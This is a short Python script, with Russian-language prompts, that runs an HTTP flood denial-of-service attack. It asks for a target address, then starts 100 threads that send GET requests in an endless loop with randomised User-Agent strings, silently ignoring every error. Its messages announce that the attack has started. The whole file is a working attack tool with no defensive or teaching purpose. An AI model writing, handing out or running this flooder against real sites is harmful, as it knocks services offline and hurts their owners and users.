import threading
import requests
import random
from fake_useragent import UserAgent

def advanced_dos():
    target = input("введи айпишку целевую: ").strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
        
    print("Атака запущена, ес хоч ее остоновить прожми Ctrl+c")
    
    ua = UserAgent()
    threads_count = 100
    
    def flood():
        while True:
            try:
                headers = {'User-Agent': ua.random}
                requests.get(target, headers=headers, timeout=3)
            except:
                continue
                
    for _ in range(threads_count):
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()
        
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\nАтака пошла назуй(")

if __name__ == "__main__":
    advanced_dos()
